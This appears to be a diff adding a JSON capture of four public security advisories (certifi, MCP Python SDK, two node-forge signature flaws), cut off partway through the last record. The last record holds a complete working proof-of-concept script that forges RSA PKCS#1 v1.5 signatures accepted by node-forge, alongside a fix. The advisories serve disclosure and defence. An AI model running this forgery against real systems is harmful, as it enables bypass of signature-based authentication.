@@ -1,0 +1,613 @@
+{
+  "admission": "NONE",
+  "source": "OFFICIAL_GITHUB_PUBLIC_ADVISORY_API",
+  "records": [
+    {
+      "id": "GHSA-6q48-6c7w-9gw2",
+      "url": "https://api.github.com/advisories/GHSA-6q48-6c7w-9gw2",
+      "observed_utc": "2026-10-21T04:20:10.396203+00:00",
+      "status": 200,
+      "response_sha256": "744e6f07692b60127a7de335386ad71a2b6e27a27f6879d969ec6fc81a9705b7",
+      "response": {
+        "ghsa_id": "GHSA-6q48-6c7w-9gw2",
+        "cve_id": null,
+        "url": "https://api.github.com/advisories/GHSA-6q48-6c7w-9gw2",
+        "html_url": "https://github.com/advisories/GHSA-6q48-6c7w-9gw2",
+        "summary": "certifi bundles emSign root CAs with compromised intermediate CA keys",
+        "description": "Certifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them. \n\nAn attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.\n\nCertifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi.",
+        "type": "reviewed",
+        "severity": "critical",
+        "repository_advisory_url": "https://api.github.com/repos/certifi/python-certifi/security-advisories/GHSA-6q48-6c7w-9gw2",
+        "source_code_location": "https://github.com/certifi/python-certifi",
+        "identifiers": [
+          {
+            "value": "GHSA-6q48-6c7w-9gw2",
+            "type": "GHSA"
+          }
+        ],
+        "references": [
+          "https://github.com/certifi/python-certifi/security/advisories/GHSA-6q48-6c7w-9gw2",
+          "https://discuss.python.org/t/information-for-python-users-regarding-emudhra-emsign-ca-certificate-security-incident/109576",
+          "https://emudhra.we-have-a-problem.com",
+          "https://github.com/advisories/GHSA-6q48-6c7w-9gw2"
+        ],
+        "published_at": "2026-10-20T19:35:05Z",
+        "updated_at": "2026-10-20T19:35:06Z",
+        "github_reviewed_at": "2026-10-20T19:35:05Z",
+        "nvd_published_at": null,
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "certifi"
+            },
+            "vulnerable_version_range": ">= 2019.03.09, < 2026.10.19",
+            "first_patched_version": "2026.10.19",
+            "vulnerable_functions": []
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": null,
+            "score": 0.0
+          },
+          "cvss_v4": {
+            "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+            "score": 9.1
+          }
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-295",
+            "name": "Improper Certificate Validation"
+          }
+        ],
+        "credits": [],
+        "comments": 0,
+        "cvss": {
+          "vector_string": null,
+          "score": null
+        }
+      }
+    },
+    {
+      "id": "GHSA-84m7-p3x7-pcfv",
+      "url": "https://api.github.com/advisories/GHSA-84m7-p3x7-pcfv",
+      "observed_utc": "2026-10-21T04:20:10.397203+00:00",
+      "status": 200,
+      "response_sha256": "9584d87f69d29768d82d2a321b3f373f961b2a501df79bd46d82c6e6c46b6179",
+      "response": {
+        "ghsa_id": "GHSA-84m7-p3x7-pcfv",
+        "cve_id": "CVE-2026-59951",
+        "url": "https://api.github.com/advisories/GHSA-84m7-p3x7-pcfv",
+        "html_url": "https://github.com/advisories/GHSA-84m7-p3x7-pcfv",
+        "summary": "MCP Python SDK: Unbounded Session Accumulation in StreamableHTTP Transport Enables Resource Exhaustion",
+        "description": "### Summary\nIn affected versions, a Streamable HTTP server in stateful mode (the default) never reclaimed session state:\n\n- sessions did not expire;\n- a client `DELETE` ended the session but left its entry registered;\n- a session whose first request was refused stayed registered with a running task.\n\nEach session also kept its parsed `initialize` parameters, and the number of sessions was unlimited. A client that could reach the endpoint could grow server memory without bound using ordinary short requests; only a restart reclaimed it.\n\n### Am I affected?\nYes, if you serve MCP over Streamable HTTP in stateful mode and clients you do not fully trust can reach the endpoint. Stateful mode is the default for:\n\n- `FastMCP` (1.x)\n- `MCPServer` and `Server.streamable_http_app()` (2.x)\n- `StreamableHTTPSessionManager`\n\nAffected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.\n\nNot affected:\n\n- servers on 1.12.0 or later passing `stateless_http=True` (no sessions are kept)\n- servers using only the stdio or SSE transports\n\nAuthentication limits who can open sessions, not how many a token holder can open.\n\n### Fix\nUpgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. In those versions:\n\n- a session with no request in flight for `session_idle_timeout` seconds (default 1800) is closed and its ID then answers `404`; open streams and in-progress requests keep it alive;\n- at most `max_sessions` sessions exist at once (default 10000); a request that would open another is answered `503`;\n- a session is discarded as soon as it ends, whether by `DELETE`, expiry, or a refused opening request.\n\nBoth settings are keyword arguments on `FastMCP(...)` (1.x), `MCPServer.run()` / `streamable_http_app()` (2.x) and `StreamableHTTPSessionManager`; `None` disables them.\n\nThis bounds retention rather than eliminating it: a live session still holds its `initialize` parameters (up to roughly twice the 4 MiB body limit), and an `initialize` with invalid parameters still opens a session that expires like any other. On a small host, lower `session_idle_timeout`, `max_sessions` and `max_request_body_size` to fit.\n\nIf you cannot upgrade yet, pass `stateless_http=True` (1.12.0 or later) where you need no per-session state, or restrict who can reach the endpoint.",
+        "type": "reviewed",
+        "severity": "medium",
+        "repository_advisory_url": "https://api.github.com/repos/modelcontextprotocol/python-sdk/security-advisories/GHSA-84m7-p3x7-pcfv",
+        "source_code_location": "https://github.com/modelcontextprotocol/python-sdk",
+        "identifiers": [
+          {
+            "value": "GHSA-84m7-p3x7-pcfv",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-59951",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-84m7-p3x7-pcfv",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-59951",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/3395",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/3426",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/92120b4b0f50385af096592d7cee932fc1d994e7",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/d2290ca3434731b68ea3e2270bc06a6e6575931b",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.30.0",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.2.0",
+          "https://github.com/advisories/GHSA-84m7-p3x7-pcfv"
+        ],
+        "published_at": "2026-10-15T20:13:13Z",
+        "updated_at": "2026-10-15T20:13:14Z",
+        "github_reviewed_at": "2026-10-15T20:13:13Z",
+        "nvd_published_at": "2026-10-14T17:18:29Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "mcp"
+            },
+            "vulnerable_version_range": ">= 1.8.0, < 1.30.0",
+            "first_patched_version": "1.30.0",
+            "vulnerable_functions": []
+          },
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "mcp"
+            },
+            "vulnerable_version_range": ">= 2.0.0, < 2.2.0",
+            "first_patched_version": "2.2.0",
+            "vulnerable_functions": []
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "score": 7.5
+          },
+          "cvss_v4": {
+            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+            "score": 6.9
+          }
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-400",
+            "name": "Uncontrolled Resource Consumption"
+          },
+          {
+            "cwe_id": "CWE-770",
+            "name": "Allocation of Resources Without Limits or Throttling"
+          },
+          {
+            "cwe_id": "CWE-772",
+            "name": "Missing Release of Resource after Effective Lifetime"
+          }
+        ],
+        "credits": [
+          {
+            "user": {
+              "login": "rharang",
+              "id": 8082617,
+              "node_id": "MDQ6VXNlcjgwODI2MTc=",
+              "avatar_url": "https://avatars.githubusercontent.com/u/8082617?v=4",
+              "gravatar_id": "",
+              "url": "https://api.github.com/users/rharang",
+              "html_url": "https://github.com/rharang",
+              "followers_url": "https://api.github.com/users/rharang/followers",
+              "following_url": "https://api.github.com/users/rharang/following{/other_user}",
+              "gists_url": "https://api.github.com/users/rharang/gists{/gist_id}",
+              "starred_url": "https://api.github.com/users/rharang/starred{/owner}{/repo}",
+              "subscriptions_url": "https://api.github.com/users/rharang/subscriptions",
+              "organizations_url": "https://api.github.com/users/rharang/orgs",
+              "repos_url": "https://api.github.com/users/rharang/repos",
+              "events_url": "https://api.github.com/users/rharang/events{/privacy}",
+              "received_events_url": "https://api.github.com/users/rharang/received_events",
+              "type": "User",
+              "user_view_type": "public",
+              "site_admin": false
+            },
+            "type": "finder"
+          },
+          {
+            "user": {
+              "login": "evilgensec",
+              "id": 183680293,
+              "node_id": "U_kgDOCvK9JQ",
+              "avatar_url": "https://avatars.githubusercontent.com/u/183680293?v=4",
+              "gravatar_id": "",
+              "url": "https://api.github.com/users/evilgensec",
+              "html_url": "https://github.com/evilgensec",
+              "followers_url": "https://api.github.com/users/evilgensec/followers",
+              "following_url": "https://api.github.com/users/evilgensec/following{/other_user}",
+              "gists_url": "https://api.github.com/users/evilgensec/gists{/gist_id}",
+              "starred_url": "https://api.github.com/users/evilgensec/starred{/owner}{/repo}",
+              "subscriptions_url": "https://api.github.com/users/evilgensec/subscriptions",
+              "organizations_url": "https://api.github.com/users/evilgensec/orgs",
+              "repos_url": "https://api.github.com/users/evilgensec/repos",
+              "events_url": "https://api.github.com/users/evilgensec/events{/privacy}",
+              "received_events_url": "https://api.github.com/users/evilgensec/received_events",
+              "type": "User",
+              "user_view_type": "public",
+              "site_admin": false
+            },
+            "type": "reporter"
+          },
+          {
+            "user": {
+              "login": "Madan301",
+              "id": 111639304,
+              "node_id": "U_kgDOBqd7CA",
+              "avatar_url": "https://avatars.githubusercontent.com/u/111639304?v=4",
+              "gravatar_id": "",
+              "url": "https://api.github.com/users/Madan301",
+              "html_url": "https://github.com/Madan301",
+              "followers_url": "https://api.github.com/users/Madan301/followers",
+              "following_url": "https://api.github.com/users/Madan301/following{/other_user}",
+              "gists_url": "https://api.github.com/users/Madan301/gists{/gist_id}",
+              "starred_url": "https://api.github.com/users/Madan301/starred{/owner}{/repo}",
+              "subscriptions_url": "https://api.github.com/users/Madan301/subscriptions",
+              "organizations_url": "https://api.github.com/users/Madan301/orgs",
+              "repos_url": "https://api.github.com/users/Madan301/repos",
+              "events_url": "https://api.github.com/users/Madan301/events{/privacy}",
+              "received_events_url": "https://api.github.com/users/Madan301/received_events",
+              "type": "User",
+              "user_view_type": "public",
+              "site_admin": false
+            },
+            "type": "reporter"
+          },
+          {
+            "user": {
+              "login": "subchat",
+              "id": 82167489,
+              "node_id": "MDQ6VXNlcjgyMTY3NDg5",
+              "avatar_url": "https://avatars.githubusercontent.com/u/82167489?v=4",
+              "gravatar_id": "",
+              "url": "https://api.github.com/users/subchat",
+              "html_url": "https://github.com/subchat",
+              "followers_url": "https://api.github.com/users/subchat/followers",
+              "following_url": "https://api.github.com/users/subchat/following{/other_user}",
+              "gists_url": "https://api.github.com/users/subchat/gists{/gist_id}",
+              "starred_url": "https://api.github.com/users/subchat/starred{/owner}{/repo}",
+              "subscriptions_url": "https://api.github.com/users/subchat/subscriptions",
+              "organizations_url": "https://api.github.com/users/subchat/orgs",
+              "repos_url": "https://api.github.com/users/subchat/repos",
+              "events_url": "https://api.github.com/users/subchat/events{/privacy}",
+              "received_events_url": "https://api.github.com/users/subchat/received_events",
+              "type": "User",
+              "user_view_type": "public",
+              "site_admin": false
+            },
+            "type": "reporter"
+          },
+          {
+            "user": {
+              "login": "nickelsec",
+              "id": 300981992,
+              "node_id": "U_kgDOEfCe6A",
+              "avatar_url": "https://avatars.githubusercontent.com/u/300981992?v=4",
+              "gravatar_id": "",
+              "url": "https://api.github.com/users/nickelsec",
+              "html_url": "https://github.com/nickelsec",
+              "followers_url": "https://api.github.com/users/nickelsec/followers",
+              "following_url": "https://api.github.com/users/nickelsec/following{/other_user}",
+              "gists_url": "https://api.github.com/users/nickelsec/gists{/gist_id}",
+              "starred_url": "https://api.github.com/users/nickelsec/starred{/owner}{/repo}",
+              "subscriptions_url": "https://api.github.com/users/nickelsec/subscriptions",
+              "organizations_url": "https://api.github.com/users/nickelsec/orgs",
+              "repos_url": "https://api.github.com/users/nickelsec/repos",
+              "events_url": "https://api.github.com/users/nickelsec/events{/privacy}",
+              "received_events_url": "https://api.github.com/users/nickelsec/received_events",
+              "type": "User",
+              "user_view_type": "public",
+              "site_admin": false
+            },
+            "type": "reporter"
+          }
+        ],
+        "comments": 1,
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "epss": {
+          "percentage": 0.00458,
+          "percentile": 0.38172
+        }
+      }
+    },
+    {
+      "id": "GHSA-86w9-cpqp-85rv",
+      "url": "https://api.github.com/advisories/GHSA-86w9-cpqp-85rv",
+      "observed_utc": "2026-10-21T04:20:10.397203+00:00",
+      "status": 200,
+      "response_sha256": "3be0dee541f8ecd819de2f230fd0f79137951cbdd1d109ecd3a52baff97e6b1f",
+      "response": {
+        "ghsa_id": "GHSA-86w9-cpqp-85rv",
+        "cve_id": "CVE-2026-85393",
+        "url": "https://api.github.com/advisories/GHSA-86w9-cpqp-85rv",
+        "html_url": "https://github.com/advisories/GHSA-86w9-cpqp-85rv",
+        "summary": "node-forge RSA PKCS#1 v1.5 signature verification accepts extra nested DigestAlgorithm elements",
+        "description": "node-forge through 1.4.0 fails to validate element count in nested DigestAlgorithm sequences during RSA PKCS#1 v1.5 signature verification. Attackers can embed garbage bytes inside the DigestAlgorithm sequence to forge valid signatures for arbitrary messages using low-exponent RSA keys. This is an incomplete fix for CVE-2026-33894.",
+        "type": "reviewed",
+        "severity": "high",
+        "repository_advisory_url": null,
+        "source_code_location": "https://github.com/digitalbazaar/forge",
+        "identifiers": [
+          {
+            "value": "GHSA-86w9-cpqp-85rv",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-85393",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-85393",
+          "https://github.com/digitalbazaar/forge/issues/1149",
+          "https://github.com/advisories/GHSA-ppp5-5v6c-4jwp",
+          "https://github.com/digitalbazaar/forge/blob/v1.4.0/lib/asn1.js",
+          "https://github.com/digitalbazaar/forge/blob/v1.4.0/lib/rsa.js",
+          "https://www.vulncheck.com/advisories/node-forge-through-1.4.0-rsa-pkcs-1-1.5-signature-forgery-via-nested-digestalgorithm-padding",
+          "https://github.com/digitalbazaar/forge/pull/1152",
+          "https://github.com/advisories/GHSA-86w9-cpqp-85rv"
+        ],
+        "published_at": "2026-09-03T21:31:15Z",
+        "updated_at": "2026-10-01T21:09:10Z",
+        "github_reviewed_at": "2026-10-01T21:09:09Z",
+        "nvd_published_at": "2026-09-03T19:17:31Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "npm",
+              "name": "node-forge"
+            },
+            "vulnerable_version_range": "<= 1.4.0",
+            "first_patched_version": null,
+            "vulnerable_functions": []
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+            "score": 7.5
+          },
+          "cvss_v4": {
+            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+            "score": 8.7
+          }
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-347",
+            "name": "Improper Verification of Cryptographic Signature"
+          }
+        ],
+        "credits": [],
+        "comments": 0,
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+          "score": 7.5
+        },
+        "epss": {
+          "percentage": 0.00326,
+          "percentile": 0.23564
+        }
+      }
+    },
+    {
+      "id": "GHSA-ppp5-5v6c-4jwp",
+      "url": "https://api.github.com/advisories/GHSA-ppp5-5v6c-4jwp",
+      "observed_utc": "2026-10-21T04:20:10.397203+00:00",
+      "status": 200,
+      "response_sha256": "ccb955e31735e69e42f67fba46619033b084a45ade77120a84c28bbf5507c8ee",
+      "response": {
+        "ghsa_id": "GHSA-ppp5-5v6c-4jwp",
+        "cve_id": "CVE-2026-33894",
+        "url": "https://api.github.com/advisories/GHSA-ppp5-5v6c-4jwp",
+        "html_url": "https://github.com/advisories/GHSA-ppp5-5v6c-4jwp",
+        "summary": "Forge has signature forgery in RSA-PKCS due to ASN.1 extra field  ",
+        "description": "## Summary\nRSASSA PKCS#1 v1.5 signature verification accepts forged signatures for low public exponent keys (e=3). Attackers can forge signatures by stuffing \u201cgarbage\u201d bytes within the ASN structure in order to construct a signature that passes verification, enabling [Bleichenbacher style forgery](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/). This issue is similar to [CVE-2022-24771](https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765), but adds bytes in an addition field within the ASN structure, rather than outside of it. \n\nAdditionally, forge does not validate that signatures include a minimum of 8 bytes of padding as [defined by the specification](https://datatracker.ietf.org/doc/html/rfc2313#section-8), providing attackers additional space to construct Bleichenbacher forgeries. \n\n## Impacted Deployments\n**Tested commit:** `8e1d527fe8ec2670499068db783172d4fb9012e5`\n**Affected versions:** tested on v1.3.3 (latest release) and recent prior versions.\n\n**Configuration assumptions:**\n- Invoke key.verify with defaults (default `scheme` uses RSASSA-PKCS1-v1_5).\n- `_parseAllDigestBytes: true` (default setting).\n\n## Root Cause\n\nIn `lib/rsa.js`, `key.verify(...)`, forge decrypts the signature block, decodes PKCS#1 v1.5 padding (`_decodePkcs1_v1_5`), parses ASN.1, and compares `capture.digest` to the provided digest.\n\nTwo issues are present with this logic:\n\n1. Strict DER byte-consumption (`_parseAllDigestBytes`) only guarantees all bytes are parsed, not that the parsed structure is the canonical minimal DigestInfo shape expected by RFC 8017 verification semantics. A forged EM with attacker-controlled additional ASN.1 content inside the parsed container can still pass forge verification while OpenSSL rejects it.\n2. `_decodePkcs1_v1_5` comments mention that PS < 8 bytes should be rejected, but does not implement this logic.\n\n## Reproduction Steps\n1. Use Node.js (tested with `v24.9.0`) and clone `digitalbazaar/forge` at commit `8e1d527fe8ec2670499068db783172d4fb9012e5`.\n4. Place and run the PoC script (`repro_min.js`) with `node repro_min.js` in the same level as the `forge` folder.\n5. The script generates a fresh RSA keypair (`4096` bits, `e=3`), creates a normal control signature, then computes a forged candidate using cube-root interval construction.\n6. The script verifies both signatures with:\n  - forge verify (`_parseAllDigestBytes: true`), and\n  - Node/OpenSSL verify (`crypto.verify` with `RSA_PKCS1_PADDING`).\n7. Confirm output includes:\n  - `control-forge-strict: true`\n  - `control-node: true`\n  - `forgery (forge library, strict): true`\n  - `forgery (node/OpenSSL): false`\n\n## Proof of Concept\n\n**Overview:**\n- Demonstrates a valid control signature and a forged signature in one run.\n- Uses strict forge parsing mode explicitly (`_parseAllDigestBytes: true`, also forge default).\n- Uses Node/OpenSSL as an differential verification baseline.\n- Observed output on tested commit:\n\n```text\ncontrol-forge-strict: true\ncontrol-node: true\nforgery (forge library, strict): true\nforgery (node/OpenSSL): false\n```\n\n<details><summary>repro_min.js</summary>\n\n```javascript\n#!/usr/bin/env node\n'use strict';\n\nconst crypto = require('crypto');\nconst forge = require('./forge/lib/index');\n\n// DER prefix for PKCS#1 v1.5 SHA-256 DigestInfo, without the digest bytes:\n// SEQUENCE {\n//   SEQUENCE { OID sha256, NULL },\n//   OCTET STRING <32-byte digest>\n// }\n// Hex: 30 0d 06 09 60 86 48 01 65 03 04 02 01 05 00 04 20\nconst DIGESTINFO_SHA256_PREFIX = Buffer.from(\n  '300d060960864801650304020105000420',\n  'hex'\n);\n\nconst toBig = b => BigInt('0x' + (b.toString('hex') || '0'));\nfunction toBuf(n, len) {\n  let h = n.toString(16);\n  if (h.length % 2) h = '0' + h;\n  const b = Buffer.from(h, 'hex');\n  return b.length < len ? Buffer.concat([Buffer.alloc(len - b.length), b]) : b;\n}\nfunction cbrtFloor(n) {\n  let lo = 0n;\n  let hi = 1n;\n  while (hi * hi * hi <= n) hi <<= 1n;\n  while (lo + 1n < hi) {\n    const mid = (lo + hi) >> 1n;\n    if (mid * mid * mid <= n) lo = mid;\n    else hi = mid;\n  }\n  return lo;\n}\nconst cbrtCeil = n => {\n  const f = cbrtFloor(n);\n  return f * f * f === n ? f : f + 1n;\n};\nfunction derLen(len) {\n  if (len < 0x80) return Buffer.from([len]);\n  if (len <= 0xff) return Buffer.from([0x81, len]);\n  return Buffer.from([0x82, (len >> 8) & 0xff, len & 0xff]);\n}\n\nfunction forgeStrictVerify(publicPem, msg, sig) {\n  const key = forge.pki.publicKeyFromPem(publicPem);\n  const md = forge.md.sha256.create();\n  md.update(msg.toString('utf8'), 'utf8');\n  try {\n    // verify(digestBytes, signatureBytes, scheme, options):\n    // - digestBytes: raw SHA-256 digest bytes for `msg`\n    // - signatureBytes: binary-string representation of the candidate signature\n    // - scheme: undefined => default RSASSA-PKCS1-v1_5\n    // - options._parseAllDigestBytes: require DER parser to consume all bytes\n    //   (this is forge's default for verify; set explicitly here for clarity)\n    return { ok: key.verify(md.digest().getBytes(), sig.toString('binary'), undefined, { _parseAllDigestBytes: true }) };\n  } catch (err) {\n    return { ok: false, err: err.message };\n  }\n}\n\nfunction main() {\n  const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {\n    modulusLength: 4096,\n    publicExponent: 3,\n    privateKeyEncoding: { type: 'pkcs1', format: 'pem' },\n    publicKeyEncoding: { type: 'pkcs1', format: 'pem' }\n  });\n\n  const jwk = crypto.createPublicKey(publicKey).export({ format: 'jwk' });\n  const nBytes = Buffer.from(jwk.n, 'base64url');\n  const n = toBig(nBytes);\n  const e = toBig(Buffer.from(jwk.e, 'base64url'));\n  if (e !== 3n) throw new Error('expected e=3');\n\n  const msg = Buffer.from('forged-message-0', 'utf8');\n  const digest = crypto.createHash('sha256').update(msg).digest();\n  const algAndDigest = Buffer.concat([DIGESTINFO_SHA256_PREFIX, digest]);\n\n  // Minimal prefix that forge currently accepts: 00 01 00 + DigestInfo + extra OCTET STRING.\n  const k = nBytes.length;\n  // ffCount can be set to any value at or below 111 and produce a valid signature.\n  // ffCount should be rejected for values below 8, since that would constitute a malformed PKCS1 package.\n  // However, current versions of node forge do not check for this.\n  // Rejection of packages with less than 8 bytes of padding is bad but does not constitute a vulnerability by itself.\n  const ffCount = 0; \n  // `garbageLen` affects DER length field sizes, which in turn affect how\n  // many bytes remain for garbage. Iterate to a fixed point so total EM size is exactly `k`.\n  // A small cap (8) is enough here: DER length-size transitions are discrete\n  // and few (<128, <=255, <=65535, ...), so this stabilizes quickly.\n  let garbageLen = 0;\n  for (let i = 0; i < 8; i += 1) {\n    const gLenEnc = derLen(garbageLen).length;\n    const seqLen = algAndDigest.length + 1 + gLenEnc + garbageLen;\n    const seqLenEnc = derLen(seqLen).length;\n    const fixed = 2 + ffCount + 1 + 1 + seqLenEnc + algAndDigest.length + 1 + gLenEnc;\n    const next = k - fixed;\n    if (next === garbageLen) break;\n    garbageLen = next;\n  }\n  const seqLen = algAndDigest.length + 1 + derLen(garbageLen).length + garbageLen;\n  const prefix = Buffer.concat([\n    Buffer.from([0x00, 0x01]),\n    Buffer.alloc(ffCount, 0xff),\n    Buffer.from([0x00]),\n    Buffer.from([0x30]), derLen(seqLen),\n    algAndDigest,\n    Buffer.from([0x04]), derLen(garbageLen)\n  ]);\n\n  // Build the numeric interval of all EM values that start with `prefix`:\n  // - `low`  = prefix || 00..00\n  // - `high` = one past (prefix || ff..ff)\n  // Then find `s` such that s^3 is inside [low, high), so EM has our prefix.\n  const suffixLen = k - prefix.length;\n  const low = toBig(Buffer.concat([prefix, Buffer.alloc(suffixLen)]));\n  const high = low + (1n << BigInt(8 * suffixLen));\n  const s = cbrtCeil(low);\n  if (s > cbrtFloor(high - 1n) || s >= n) throw new Error('no candidate in interval');\n\n  const sig = toBuf(s, k);\n\n  const controlMsg = Buffer.from('control-message', 'utf8');\n  const controlSig = crypto.sign('sha256', controlMsg, {\n    key: privateKey,\n    padding: crypto.constants.RSA_PKCS1_PADDING\n  });\n\n  // forge verification calls (library under test)\n  const controlForge = forgeStrictVerify(publicKey, controlMsg, controlSig);\n  const forgedForge = forgeStrictVerify(publicKey, msg, sig);\n\n  // Node.js verification calls (OpenSSL-backed reference behavior)\n  const controlNode = crypto.verify('sha256', controlMsg, {\n    key: publicKey,\n    padding: crypto.constants.RSA_PKCS1_PADDING\n  }, controlSig);\n  const forgedNode = crypto.verify('sha256', msg, {\n    key: publicKey,\n    padding: crypto.constants.RSA_PKCS1_PADDING\n  }, sig);\n\n  console.log('control-forge-strict:', controlForge.ok, controlForge.err || '');\n  console.log('control-node:', controlNode);\n  console.log('forgery (forge library, strict):', forgedForge.ok, forgedForge.err || '');\n  console.log('forgery (node/OpenSSL):', forgedNode);\n}\n\nmain();\n```\n</details>\n\n## Suggested Patch\n- Enforce PKCS#1 v1.5 BT=0x01 minimum padding length (`PS >= 8`) in `_decodePkcs1_v1_5` before accepting the block.\n- Update the RSASSA-PKCS1-v1_5 verifier to require canonical DigestInfo structure only (no extra attacker-controlled ASN.1 content beyond expected fields).\n\nHere is a Forge-tested patch to resolve the issue, though it should be verified for consumer projects:\n\n```diff\nindex b207a63..ec8a9c1 100644\n--- a/lib/rsa.js\n+++ b/lib/rsa.js\n@@ -1171,6 +1171,14 @@ pki.setRsaPublicKey = pki.rsa.setPublicKey = function(n, e) {\n             error.errors = errors;\n             throw error;\n           }\n+\n+          if(obj.value.length != 2) {\n+            var error = new Error(\n+              'DigestInfo ASN.1 object must contain exactly 2 fields for ' +\n+              'a valid RSASSA-PKCS1-v1_5 package.');\n+            error.errors = errors;\n+            throw error;\n+          }\n           // check hash algorithm identifier\n           // see PKCS1-v1-5DigestAlgorithms in RFC 8017\n           // FIXME: add support to validator for strict value choices\n@@ -1673,6 +1681,10 @@ function _decodePkcs1_v1_5(em, key, pub, ml) {\n       }\n       ++padNum;\n     }\n+\n+    if (padNum < 8) {\n+      throw new Error('Encryption block is invalid.');\n+    }\n   } else if(bt === 0x02) {\n     // look for 0x00 byte\n     padNum = 0;\n```\n## Resources\n- RFC 2313 (PKCS v1.5): https://datatracker.ietf.org/doc/html/rfc2313#section-8\n  - > This limitation guarantees that the length of the padding string PS is at least eight octets, which is a security condition. \n- RFC 8017: https://www.rfc-editor.org/rfc/rfc8017.html\n- `lib/rsa.js` `key.verify(...)` at lines ~1139-1223.\n- `lib/rsa.js` `_decodePkcs1_v1_5(...)` at lines ~1632-1695.\n\n## Credit\n\nThis vulnerability was discovered as part of a U.C. Berkeley security research project by: Austin Chu, Sohee Kim, and Corban Villa.",
+        "type": "reviewed",
+        "severity": "high",
+        "repository_advisory_url": "https://api.github.com/repos/digitalbazaar/forge/security-advisories/GHSA-ppp5-5v6c-4jwp",
+        "source_code_location": "https://github.com/digitalbazaar/forge",
+        "identifiers": [
+          {
+            "value": "GHSA-ppp5-5v6c-4jwp",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-33894",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          "https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765",
+          "https://github.com/digitalbazaar/forge/security/advisories/GHSA-ppp5-5v6c-4jwp",
+          "https://datatracker.ietf.org/doc/html/rfc2313#section-8",
+          "https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE",
+          "https://www.rfc-editor.org/rfc/rfc8017.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-33894",
+          "https://github.com/advisories/GHSA-ppp5-5v6c-4jwp"
+        ],
+        "published_at": "2026-03-26T22:02:35Z",
+        "updated_at": "2026-03-29T21:41:48Z",
+        "github_reviewed_at": "2026-03-26T22:02:35Z",
+        "nvd_published_at": "2026-03-27T21:17:25Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "npm",
+              "name": "node-forge"
+            },
+            "vulnerable_version_range": "< 1.4.0",
+            "first_patched_version": "1.4.0",
+            "vulnerable_functions": []
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+            "score": 7.5
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-20",
+            "name": "Improper Input Validation"
+          },
+          {
+            "cwe_id": "CWE-347",
+            "name": "Improper Verification of Cryptographic Signature"
+          }
+        ],
+        "credits": [
+          {
+            "user": {
+              "login": "corbanvilla",
+              "id": 5652142,
+              "node_id": "MDQ6VXNlcjU2NTIxNDI=",
+              "avatar_url": "https://avatars.githubusercontent.com/u/5652142?v=4",
+              "gravatar_id": "",
+              "url": "https://api.github.com/users/corbanvilla",
+              "html_url": "https://github.com/corbanvilla",
+              "followers_url": "https://api.github.com/users/corbanvilla/followers",
